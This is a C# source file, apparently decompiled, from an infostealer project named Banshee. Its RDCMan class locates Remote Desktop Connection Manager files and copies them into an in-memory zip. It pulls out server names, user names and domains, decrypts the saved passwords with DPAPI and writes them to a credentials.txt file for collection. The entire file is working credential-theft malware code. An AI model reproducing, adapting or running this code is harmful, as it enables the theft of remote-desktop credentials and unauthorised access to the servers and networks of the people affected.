﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;
using Banshee.Helper.Data;
using Banshee.Helper.Encrypted;

namespace Banshee.Targets.Applications
{
	// Token: 0x020000A3 RID: 163
	public class RDCMan : ITarget
	{
		// Token: 0x060001E4 RID: 484 RVA: 0x0000FFAC File Offset: 0x0000FFAC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Remote Desktop Connection Manager", "RDCMan.settings");
			if (!File.Exists(path))
			{
				return;
			}
			List<string> list = new List<string>();
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(File.ReadAllText(path));
			XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//FilesToOpen");
			if (xmlNodeList != null)
			{
				foreach (object obj in xmlNodeList)
				{
					string innerText = ((XmlNode)obj).InnerText;
					if (!string.IsNullOrEmpty(innerText) && !list.Contains(innerText))
					{
						list.Add(innerText);
					}
				}
			}
			if (!list.Any<string>())
			{
				return;
			}
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "RDCMan";
			StringBuilder stringBuilder = new StringBuilder();
			foreach (string text in list)
			{
				if (File.Exists(text))
				{
					string text2 = "RDCMan\\" + Path.GetFileName(text);
					zip.AddFile(text2, File.ReadAllBytes(text));
					counterApplications.Files.Add(text + " => " + text2);
					XmlDocument xmlDocument2 = new XmlDocument();
					xmlDocument2.LoadXml(File.ReadAllText(text));
					XmlNodeList xmlNodeList2 = xmlDocument2.SelectNodes("//server");
					if (xmlNodeList2 != null && xmlNodeList2.Count != 0)
					{
						stringBuilder.AppendLine("SourceFile: " + text);
						stringBuilder.AppendLine(string.Format("Found servers: {0}", xmlNodeList2.Count));
						stringBuilder.AppendLine();
						foreach (object obj2 in xmlNodeList2)
						{
							XmlNode xmlNode = (XmlNode)obj2;
							string str = string.Empty;
							string str2 = string.Empty;
							string text3 = string.Empty;
							string text4 = string.Empty;
							string text5 = string.Empty;
							foreach (object obj3 in xmlNode)
							{
								foreach (object obj4 in ((XmlNode)obj3))
								{
									XmlNode xmlNode2 = (XmlNode)obj4;
									string name = xmlNode2.Name;
									if (!(name == "name"))
									{
										if (!(name == "profileName"))
										{
											if (!(name == "userName"))
											{
												if (!(name == "password"))
												{
													if (name == "domain")
													{
														text5 = xmlNode2.InnerText;
													}
												}
												else
												{
													text4 = xmlNode2.InnerText;
												}
											}
											else
											{
												text3 = xmlNode2.InnerText;
											}
										}
										else
										{
											str2 = xmlNode2.InnerText;
										}
									}
									else
									{
										str = xmlNode2.InnerText;
									}
								}
							}
							if (!string.IsNullOrEmpty(text4))
							{
								string str3 = this.DecryptPassword(text4);
								stringBuilder.AppendLine("----");
								stringBuilder.AppendLine("HostName: " + str);
								stringBuilder.AppendLine("ProfileName: " + str2);
								stringBuilder.AppendLine("UserName: " + (string.IsNullOrEmpty(text5) ? text3 : (text5 + "\\" + text3)));
								stringBuilder.AppendLine("DecryptedPassword: " + str3);
								stringBuilder.AppendLine();
							}
						}
						string text6 = "RDCMan\\" + Path.GetFileName(text) + "\\credentials.txt";
						zip.AddTextFile(text6, stringBuilder.ToString());
						counterApplications.Files.Add(text6 ?? "");
					}
				}
			}
			if (counterApplications.Files.Count > 0)
			{
				counterApplications.Files.Add("RDCMan\\");
				counter.Applications.Add(counterApplications);
			}
		}

		// Token: 0x060001E5 RID: 485 RVA: 0x00010438 File Offset: 0x00010438
		private string DecryptPassword(string password)
		{
			byte[] array = DpApi.Decrypt(Convert.FromBase64String(password));
			if (array == null)
			{
				return string.Empty;
			}
			return Encoding.UTF8.GetString(array).TrimEnd(new char[1]);
		}
	}
}
